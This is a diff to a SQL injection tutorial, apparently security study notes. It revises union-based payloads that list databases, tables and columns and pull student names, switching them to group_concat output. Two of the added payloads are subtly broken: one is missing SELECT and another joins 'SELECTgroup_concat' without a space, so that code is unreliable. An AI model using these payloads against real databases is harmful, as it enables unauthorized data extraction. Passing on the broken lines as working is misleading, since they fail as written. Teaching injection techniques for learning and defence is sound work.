@@ -332,25 +332,28 @@ Again and again until we see the ```NULL``` where the result should be output. F
 We look for the name of the database with ```schema_name``` from the table ```INFORMATION_SCHEMA.SCHEMATA```:
 
 ```sql
-' UNION SELECT 1,schema_name FROM INFORMATION_SCHEMA.SCHEMATA -- -
+' UNION SELECT 1,group_concat(0x7c,schema_name,0x7c) FROM INFORMATION_SCHEMA.SCHEMATA -- -
 ```
+
+> Note the use of `group_concat(0x7c,schema_name,0x7c)`. This will display all the attributes in a single cell separated by `|`. If there is not enough space to show all the attributes, we can show them all at once with `group_concat()`. 
+{: .prompt-tip}
 
 We obtain all the databases names. Image we found the database ```SCHOOL``` from the previous example. We look for the tables it contains :
 
 ```sql
-' UNION SELECT TABLE_NAME,TABLE_SCHEMA FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='SCHOOL' -- -
+' UNION SELECT group_concat(0x7c,TABLE_NAME,0x7c),group_concat(0x7c,TABLE_SCHEMA,0x7c) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='SCHOOL' -- -
 ```
 
 If we want to have a look at the ```Student``` table, we can list the names of the columns like that :
 
 ```sql
-' UNION SELECT COLUMN_NAME,TABLE_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='Student' -- -
+' UNION group_concat(0x7c,COLUMN_NAME,0x7c),group_concat(0x7c,TABLE_NAME,0x7c) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='Student' -- -
 ```
 
 We get the name and the surname with :
 
 ```sql
-' UNION SELECT name, surname FROM Student -- -
+' UNION SELECTgroup_concat(0x7c,name,0x7c),group_concat(0x7c,surname,0x7c) FROM Student -- -
 ```
 
 If there are some protections, you can try to bypass them by encoding your queries, changing the case... This [PortSwigger article](https://portswigger.net/support/sql-injection-bypassing-common-filters) can explain it to you.
